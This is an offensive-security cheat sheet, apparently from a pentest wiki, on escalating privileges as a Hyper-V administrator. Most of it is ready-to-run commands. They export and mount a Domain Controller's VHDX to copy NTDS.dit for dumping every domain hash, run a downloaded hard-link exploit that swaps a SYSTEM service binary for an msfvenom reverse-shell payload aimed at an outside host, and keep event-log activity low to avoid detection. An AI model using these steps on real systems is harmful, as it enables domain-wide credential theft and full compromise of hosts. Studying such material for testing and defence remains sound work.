## Hyper-V Administrators

The Hyper-V Administrators group has full control over all Hyper-V features, including virtual machines, snapshots, and virtual disks. When Domain Controllers are running as Hyper-V guests, this group membership is effectively Domain Admin level access because the virtual DC's storage is directly accessible to the hypervisor admin. 

***

## Why This Is Domain Admin Equivalent

```
Domain Controller running as a Hyper-V VM
    |
    v
Hyper-V Admin clones the VM or exports its VHD/VHDX
    |
    v
Mounts the virtual disk offline (no Windows security applies to an unmounted disk)
    |
    v
NTDS.dit is accessible without any authentication
    |
    v
Extract all domain NTLM hashes with secretsdump.py
```

***

## Attack Path 1: Clone and Mount Virtual DC

### Step 1: Enumerate Hyper-V and Identify DC VMs

```powershell
# Confirm Hyper-V Administrators membership
whoami /groups | findstr "Hyper-V"
net localgroup "Hyper-V Administrators"

# List all VMs on the host
Get-VM

# Find VMs that are likely Domain Controllers
Get-VM | Where-Object {$_.Name -match "DC|Domain|Controller|AD"}

# Check VM configuration details including VHD paths
Get-VM | Get-VMHardDiskDrive | Select-Object VMName, Path
```

### Step 2: Export or Clone the DC VM

```powershell
# Option 1: Export the VM (creates a full copy)
Export-VM -Name "DC01" -Path "C:\Exports\"

# Option 2: Create a checkpoint (snapshot)
Checkpoint-VM -Name "DC01" -SnapshotName "attacker_snap"

# Option 3: Directly access the VHD path and copy it
# Get VHD file path
$vhd = (Get-VM -Name "DC01" | Get-VMHardDiskDrive).Path
# Output: C:\Hyper-V\Virtual Hard Disks\DC01.vhdx

# Copy the VHDX to a working directory
copy $vhd C:\Windows\Temp\DC01_copy.vhdx
```

### Step 3: Mount and Extract NTDS.dit

```powershell
# Mount the VHDX file - Windows assigns it a new drive letter
Mount-VHD -Path "C:\Exports\DC01\Virtual Hard Disks\DC01.vhdx"

# Find which drive letter was assigned
Get-PSDrive | Where-Object {$_.Provider -match "FileSystem"} | Sort-Object Name
# Or check Disk Management
Get-Disk | Get-Partition | Get-Volume

# Access NTDS.dit on the mounted volume
$mountedDrive = "F:"  # Replace with actual assigned drive letter
dir "$mountedDrive\Windows\NTDS\"

# Copy NTDS.dit and SYSTEM hive
copy "$mountedDrive\Windows\NTDS\ntds.dit" C:\Windows\Temp\ntds.dit
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.SAV

# Transfer to attack machine and extract all hashes
# secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL

# Unmount when done
Dismount-VHD -Path "C:\Exports\DC01\Virtual Hard Disks\DC01.vhdx"
```

***

## Attack Path 2: vmms.exe Hard Link Privilege Escalation

When a Hyper-V VM is deleted, the Hyper-V Virtual Machine Management Service (`vmms.exe`) attempts to restore original permissions on the associated VHDX file and does so as `NT AUTHORITY\SYSTEM` without impersonating the user. By deleting the VHDX file and replacing it with a hard link pointing to a protected SYSTEM file, the SYSTEM-level permission restoration is applied to the target file. 

```powershell
# Step 1: Download the PoC script
wget "https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1" -OutFile hyperv-eop.ps1

# Step 2: Run the script - it creates a hard link from the VHDX path to the target file
# Default target: C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
.\hyperv-eop.ps1

# Step 3: After vmms.exe runs the permission restoration, take ownership
takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# Step 4: Grant yourself full control
icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe" /grant "$($env:USERNAME):F"

# Step 5: Replace the service binary with a malicious executable
# Generate payload on attack machine:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f exe -o maintenanceservice.exe

# Copy malicious binary over the original
copy C:\Windows\Temp\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# Step 6: Start the Mozilla Maintenance Service (runs as SYSTEM)
sc start MozillaMaintenance
```

Note: This hard link technique was mitigated in the March 2020 Windows security updates. It only works on unpatched systems. 

***

## Attack Path 3: CVE-2018-0952 and CVE-2019-0841

These CVEs are relevant when the hard link technique is patched but the system is missing earlier updates: 
| CVE | Affected Systems | Description |
|---|---|---|
| CVE-2018-0952 | Windows 10, Server 2016 | Diagnostics Hub Standard Collector allows file creation in arbitrary locations as SYSTEM   |
| CVE-2019-0841 | Windows 10 / Server 2019 | AppX Deployment Service sets permissive ACLs on user-controlled files as SYSTEM |

```cmd
:: Check OS version to assess CVE applicability
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

:: Check for relevant patches
wmic qfe get HotFixID | findstr "KB4338819\|KB4462919\|KB4489899"
:: If these KBs are missing, CVE-2018-0952 / CVE-2019-0841 may be exploitable

:: Run WES-NG for definitive assessment
:: systeminfo > sysinfo.txt
:: python3 wes.py sysinfo.txt --impact "Elevation of Privilege"
```

***

## Attack Path 4: PowerShell Direct Session Hijacking

A newer attack vector: if a Hyper-V admin or domain admin uses PowerShell Direct to connect to a VM you control, you can intercept and hijack the session to steal their credentials or token. 

```powershell
# If you control a VM, monitor for incoming PowerShell Direct connections
# When an admin connects: Enter-PSSession -VMName <your_vm> -Credential (Get-Credential)
# The host process on the hypervisor has elevated context that can be abused

# PowerShell Remoting scenario:
# Admin runs: Invoke-Command -ComputerName <compromised_host> -ScriptBlock {whoami}
# On the compromised host, intercept via token impersonation
# The admin's NTLMv2 hash is exposed via the incoming authentication
```

***

## Detection Evasion Considerations

Hyper-V administrative actions generate specific event logs: 

```powershell
# Hyper-V events are logged under:
Get-WinEvent -LogName "Microsoft-Windows-Hyper-V-VMMS-Admin" | Select-Object -First 20

# Key events to generate (and avoid triggering SIEM alerts):
# Event 13010: VM Export started
# Event 13002: VM Snapshot/Checkpoint created
# Event 18310: VHD mount operation

# Low-noise approach: instead of exporting entire VM, directly copy the VHDX
# while VM is in Saved state (less activity in event logs)
Save-VM -Name "DC01"
copy "C:\Hyper-V\Virtual Hard Disks\DC01.vhdx" C:\Windows\Temp\
Start-VM -Name "DC01"
```

***

## Full Decision Flow

```
Confirmed Hyper-V Administrators membership
         |
         v
Are Domain Controllers virtualized on this host?
  YES -> Clone/Export DC VM -> Mount VHDX -> Extract NTDS.dit -> secretsdump.py
         |
  NO  -> Check if system is patched
         |
         v
March 2020 patch NOT applied?
  YES -> Hard link via hyperv-eop.ps1 -> Replace Mozilla Maintenance Service binary -> SYSTEM shell
         |
NO/Unsure -> Check CVE-2018-0952 or CVE-2019-0841 applicability via WES-NG
         |
         v
None applicable -> Look for other SYSTEM services startable by unprivileged users
                   sc query type= all | look for manually startable services
```
